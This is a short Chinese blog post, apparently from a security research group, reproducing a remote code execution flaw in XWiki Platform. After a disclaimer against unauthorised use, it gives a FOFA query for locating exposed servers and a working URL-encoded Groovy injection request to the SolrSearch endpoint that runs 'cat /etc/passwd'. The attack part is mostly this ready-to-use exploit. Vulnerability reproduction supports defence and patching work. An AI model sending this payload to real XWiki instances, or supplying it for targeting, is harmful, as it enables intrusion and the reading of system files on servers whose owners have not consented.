#  漏洞复现 || XWiki Platform系统远程代码执行   
韩文庚  我爱林   2025-05-08 10:18  
  
## 免责声明  
  
**我爱林攻防研究院的技术文章仅供参考，****任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得利用网络从事危害国家安全、荣誉和利益****，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**  
## 漏洞描述  
  
       XWiki Platform是XWiki开源的一套用于创建Web协作应用程序的Wiki平台。XWiki Platform存在安全漏洞，该漏洞源于对用户输入数据的未充分过滤，攻击者可利用Solr查询参数注入恶意代码，通过服务端模板引擎（如Velocity或Groovy）触发命令执行。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlMiaMnvLHe1ptRYQ2yQp4icxKPOLhpqZHLEA4htbNWyQllkwSoqmUlo8P4J8qgRdXDmpicptUkA500Sg/640?wx_fmt=png&from=appmsg "")  
## 资产确定  
```
fofa： body="data-xwiki-reference"
```  
## 漏洞复现  
  
1.利用如下PO  
C读取passwd  
```
GET /bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d%20 HTTP/1.1
Host: {{hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlMiaMnvLHe1ptRYQ2yQp4icxKIO9UAZh3oDV5w3rpdTwsRWKRDYQeTe7KlccHbZB7Fw3y7ydnhqhQ9Q/640?wx_fmt=png&from=appmsg "")  
  
如有侵权，请联系删除  
  
感谢您抽出  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
.  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
.  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
来阅读本文  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
**点它，分享点赞在看都在这里**  
  
